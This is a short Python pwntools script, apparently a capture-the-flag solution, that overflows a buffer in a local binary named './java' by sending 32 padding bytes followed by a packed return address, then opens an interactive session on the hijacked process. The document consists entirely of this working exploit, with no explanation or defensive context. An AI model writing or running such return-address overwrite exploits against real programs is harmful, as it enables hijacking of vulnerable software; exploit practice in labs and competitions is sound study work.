from multiprocessing import process
from pwn import *

target_address = p64(0x4007a2)
garbage=b'java'+b'A'*28
payload = garbage + target_address
p=process('./java')
p.sendline(payload)
p.interactive()